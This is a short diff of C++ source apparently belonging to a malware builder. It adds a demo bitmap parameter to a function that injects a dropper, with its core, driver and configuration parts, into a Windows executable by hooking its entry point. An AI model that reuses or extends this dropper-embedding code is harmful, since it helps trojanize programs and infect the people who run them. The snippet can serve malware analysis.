@@ -1104,7 +1104,7 @@ bool PEObject::_parseText()
 
 #define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
 
-bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix)
+bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix, bf::path demoBitmap)
 {
 	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
 	GenericSection* epSection = findSection(OEP);
@@ -1121,7 +1121,7 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	// save original code for restoring stage1
 	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, _hookPointer.stage1.size);
 	
-	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir, fPrefix) )
+	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir, fPrefix, demoBitmap) )
 		throw std::exception("Dropper build failed.");
 	
 	// base size is original resource section
